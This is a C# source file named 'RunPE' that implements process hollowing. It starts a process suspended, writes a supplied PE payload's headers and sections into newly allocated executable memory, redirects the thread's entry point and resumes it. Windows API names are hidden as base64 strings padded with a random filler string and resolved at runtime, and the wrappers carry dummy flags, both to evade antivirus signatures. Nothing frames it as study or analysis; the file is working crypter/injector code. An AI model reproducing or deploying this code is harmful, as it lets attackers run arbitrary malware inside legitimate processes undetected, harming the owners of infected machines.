using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;

namespace RunPE
{
    public static class Go
    {
        public static string Obf = Utils.GenerateRandomString(64, 128); //"+Obf+"

        public static StartupInformation Si;
        public static ProcessInformation Pi;

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct ProcessInformation
        {
            public readonly IntPtr ProcessHandle;
            public readonly IntPtr ThreadHandle;
            public readonly uint ProcessId;
            private readonly uint ThreadId;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct StartupInformation
        {
            public uint Size;
            private readonly string Reserved1;
            private readonly string Desktop;
            private readonly string Title;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 36)]
            private readonly byte[] Misc;

            private readonly IntPtr Reserved2;
            private readonly IntPtr StdInput;
            private readonly IntPtr StdOutput;
            private readonly IntPtr StdError;
        }

        private delegate int DelegateResumeThread(IntPtr handle);

        private delegate bool DelegateSetThreadContext(IntPtr thread, int[] context);

        private delegate bool DelegateGetThreadContext(IntPtr thread, int[] context);

        private delegate int DelegateVirtualAllocEx(IntPtr handle, int address, int length, int type, int protect);

        private delegate bool DelegateWriteProcessMemory(IntPtr process, int baseAddress, byte[] buffer, int bufferSize,
            ref int bytesWritten);

        private delegate bool DelegateReadProcessMemory(IntPtr process, int baseAddress, ref int buffer, int bufferSize,
            ref int bytesRead);

        private delegate bool DelegateCreateProcessA(string applicationName, string commandLine,
            IntPtr processAttributes, IntPtr threadAttributes,
            bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory,
            ref StartupInformation startupInfo, ref ProcessInformation processInformation);

        private static List<string> _list = new List<string>
        {
            "U" + Obf + "m" + Obf + "V" + Obf + "z" + Obf + "d" + Obf + "W" + Obf + "1" + Obf + "l" + Obf + "V" + Obf +
            "G" + Obf + "h" + Obf + "y" + Obf + "Z" + Obf + "W" + Obf + "F" + Obf + "k",
            "U" + Obf + "2" + Obf + "V" + Obf + "0" + Obf + "V" + Obf + "G" + Obf + "h" + Obf + "y" + Obf + "Z" + Obf +
            "W" + Obf + "F" + Obf + "k" + Obf + "Q" + Obf + "2" + Obf + "9" + Obf + "u" + Obf + "d" + Obf + "G" + Obf +
            "V" + Obf + "4" + Obf + "d" + Obf + "A" + Obf + "=" + Obf + "=" + Obf + "",
            "R" + Obf + "2" + Obf + "V" + Obf + "0" + Obf + "V" + Obf + "G" + Obf + "h" + Obf + "y" + Obf + "Z" + Obf +
            "W" + Obf + "F" + Obf + "k" + Obf + "Q" + Obf + "2" + Obf + "9" + Obf + "u" + Obf + "d" + Obf + "G" + Obf +
            "V" + Obf + "4" + Obf + "d" + Obf + "A" + Obf + "=" + Obf + "=",
            "V" + Obf + "m" + Obf + "l" + Obf + "y" + Obf + "d" + Obf + "H" + Obf + "V" + Obf + "h" + Obf + "b" + Obf +
            "E" + Obf + "F" + Obf + "s" + Obf + "b" + Obf + "G" + Obf + "9" + Obf + "j" + Obf + "R" + Obf + "X" + Obf +
            "g" + Obf + "=",
            "V" + Obf + "3" + Obf + "J" + Obf + "p" + Obf + "d" + Obf + "G" + Obf + "V" + Obf + "Q" + Obf + "c" + Obf +
            "m" + Obf + "9" + Obf + "j" + Obf + "Z" + Obf + "X" + Obf + "N" + Obf + "z" + Obf + "T" + Obf + "W" + Obf +
            "V" + Obf + "t" + Obf + "b" + Obf + "3" + Obf + "J" + Obf + "5",
            "U" + Obf + "m" + Obf + "V" + Obf + "h" + Obf + "Z" + Obf + "F" + Obf + "B" + Obf + "y" + Obf + "b" + Obf +
            "2" + Obf + "N" + Obf + "l" + Obf + "c" + Obf + "3" + Obf + "N" + Obf + "N" + Obf + "Z" + Obf + "W" + Obf +
            "1" + Obf + "v" + Obf + "c" + Obf + "n" + Obf + "k" + Obf + "=",
            "Q" + Obf + "3" + Obf + "J" + Obf + "l" + Obf + "Y" + Obf + "X" + Obf + "R" + Obf + "l" + Obf + "U" + Obf +
            "H" + Obf + "J" + Obf + "v" + Obf + "Y" + Obf + "2" + Obf + "V" + Obf + "z" + Obf + "c" + Obf + "0" + Obf +
            "E" + Obf + "="
        };

        private static readonly DelegateResumeThread ResumeThread =
            LoadApi<DelegateResumeThread>("kernel32", Utils.DecBase64(_list[0].Replace(Obf, "")));

        private static readonly DelegateSetThreadContext SetThreadContext =
            LoadApi<DelegateSetThreadContext>("kernel32", Utils.DecBase64(_list[1].Replace(Obf, "")));

        private static readonly DelegateGetThreadContext GetThreadContext =
            LoadApi<DelegateGetThreadContext>("kernel32", Utils.DecBase64(_list[2].Replace(Obf, "")));

        private static readonly DelegateVirtualAllocEx VirtualAllocEx =
            LoadApi<DelegateVirtualAllocEx>("kernel32", Utils.DecBase64(_list[3].Replace(Obf, "")));

        private static readonly DelegateWriteProcessMemory WriteProcessMemory =
            LoadApi<DelegateWriteProcessMemory>("kernel32", Utils.DecBase64(_list[4].Replace(Obf, "")));

        private static readonly DelegateReadProcessMemory ReadProcessMemory =
            LoadApi<DelegateReadProcessMemory>("kernel32", Utils.DecBase64(_list[5].Replace(Obf, "")));

        private static readonly DelegateCreateProcessA CreateProcessA =
            LoadApi<DelegateCreateProcessA>("kernel32", Utils.DecBase64(_list[6].Replace(Obf, "")));

        [DllImport("kernel32", SetLastError = true)]
        private static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string name);

        [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
        private static extern IntPtr GetProcAddress(IntPtr hProcess,
            [MarshalAs(UnmanagedType.VBByRefStr)] ref string name);

        private static TCreateApi LoadApi<TCreateApi>(string name, string method)
        {
            return (TCreateApi)(object)Marshal.GetDelegateForFunctionPointer(
                GetProcAddress(LoadLibraryA(ref name), ref method), typeof(TCreateApi));
        }

        public static void Execute(string path, byte[] payload)
        {
            Utils.ExecuteOfficial(path, payload, false);
        }

        public static void Cpa(string path, bool b)
        {
            if (b)
            {
                CreateProcessA(path, null, IntPtr.Zero, IntPtr.Zero, false, 4, IntPtr.Zero, null, ref Si, ref Pi);
            }
        }

        public static void Gtc(int[] context, bool b)
        {
            if (b)
            {
                GetThreadContext(Pi.ThreadHandle, context);
            }
        }

        public static void Rpm(int ebx, int baseAdress, int bufferSize, int lireEcrire, bool b)
        {
            if (b)
            {
                ReadProcessMemory(Pi.ProcessHandle, ebx, ref baseAdress, bufferSize, ref lireEcrire);
            }
        }

        public static int Va(int imageBase, int sizeOfImage, int type, int protect, bool b)
        {
            if (b)
            {
                return VirtualAllocEx(Pi.ProcessHandle, imageBase, sizeOfImage, type, protect);
            }

            return 0;
        }

        public static void Wpm(int fileAdress, int newImageBase, byte[] payload, int sizeOfHeader, int lireEcrire,
            int bufferSize, int ebx, bool b)
        {
            if (b)
            {
                WriteProcessMemory(Pi.ProcessHandle, newImageBase, payload, sizeOfHeader, ref lireEcrire);
                int sectionOffset = fileAdress + 248;
                short numberOfSection = BitConverter.ToInt16(payload, fileAdress + 6);
                for (int s = 0; s < numberOfSection; s++)
                {
                    int[] list =
                    {
                        BitConverter.ToInt32(payload, sectionOffset + 12 * 1),
                        BitConverter.ToInt32(payload, sectionOffset + 16 * 1),
                        BitConverter.ToInt32(payload, sectionOffset + 20 * 1)
                    };
                    if (list[1] != 0)
                    {
                        byte[] sectionData = new byte[list[1]];
                        Buffer.BlockCopy(payload, list[2], sectionData, 0, sectionData.Length);
                        WriteProcessMemory(Pi.ProcessHandle, newImageBase + list[0], sectionData,
                            sectionData.Length,
                            ref lireEcrire);
                    }

                    sectionOffset += 40;
                }

                byte[] pointerData = BitConverter.GetBytes(newImageBase);
                WriteProcessMemory(Pi.ProcessHandle, ebx, pointerData, bufferSize, ref lireEcrire);
            }
        }

        public static void End(int[] context, bool b, ProcessInformation pi)
        {
            if (b)
            {
                SetThreadContext(pi.ThreadHandle, context);
                ResumeThread(pi.ThreadHandle);
            }
        }
    }

    class Utils
    {
        public static void ExecuteOfficial(string path, byte[] payload, bool b)
        {
            if (!b)
            {
                int lireEcrire = 0;
                Go.Si.Size = Convert.ToUInt32(Marshal.SizeOf(typeof(Go.StartupInformation)));
                Go.Cpa(path, true);
                int[] context = new int[179];
                context[0] = 65538;
                Go.Gtc(context, true);
                List<int> list = new List<int>() { context[41] + 8, 0, 4 };
                Go.Rpm(list[0], list[1], list[2], lireEcrire, true);
                int fileAdress = BitConverter.ToInt32(payload, 60);
                IntPtr[] lints =
                {
                    (IntPtr)BitConverter.ToInt32(payload, 112),
                    (IntPtr)BitConverter.ToInt32(payload, fileAdress + 80),
                    (IntPtr)BitConverter.ToInt32(payload, fileAdress + 84), (IntPtr)12288, (IntPtr)64
                };
                IntPtr newImageBase =
                    (IntPtr)Go.Va((int)lints[0], (int)lints[1], (int)lints[3], (int)lints[4], true);
                Go.Wpm(fileAdress, (int)newImageBase, payload, (int)lints[2], lireEcrire, list[2], list[0], true);
                int adressOfEntryPoint = BitConverter.ToInt32(payload, fileAdress + 100);
                context[44] = (int)newImageBase + adressOfEntryPoint;
                Go.End(context, true, Go.Pi);
            }
        }

        public static string GenerateRandomString(int minLength, int maxLength)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            var random = new Random();
            var length = random.Next(minLength, maxLength + 1);
            var sb = new StringBuilder();

            for (int i = 0; i < length; i++)
            {
                sb.Append(chars[random.Next(chars.Length)]);
            }

            return sb.ToString();
        }

        public static string DecBase64(string input)
        {
            return Encoding.ASCII.GetString(Convert.FromBase64String(input));
        }
    }
}